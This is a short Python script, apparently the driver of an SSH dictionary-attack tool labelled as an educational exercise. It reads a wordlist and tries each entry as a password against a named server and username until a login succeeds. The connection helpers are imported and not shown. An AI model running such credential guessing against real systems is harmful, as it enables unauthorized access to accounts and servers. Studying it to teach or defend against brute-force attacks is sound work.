
"""
This script is intended solely for educational purposes as an exercise in imitation.
Any practical use of this script outside of educational or supervised demonstration scenarios is strictly prohibited.

Author: Mihai-Andrei Neacsu
"""

from init import init
from utils import establish_connection, get_words


def main():
    args = init()
    print(f"Getting words...")
    words = get_words(args)
    print(f"Got {len(words)} Words...")
    print(f"Start connections to {args.server} as {args.username}...")
    for index, word in enumerate(words, start=1):
        ssh_client = establish_connection(args, word)
        if ssh_client:
            print(f"Connection {index} established! {word}")
            ssh_client.close()
            break
        else:
            print(f"Connection {index} failed! {word}")



if __name__ == '__main__':
    main()
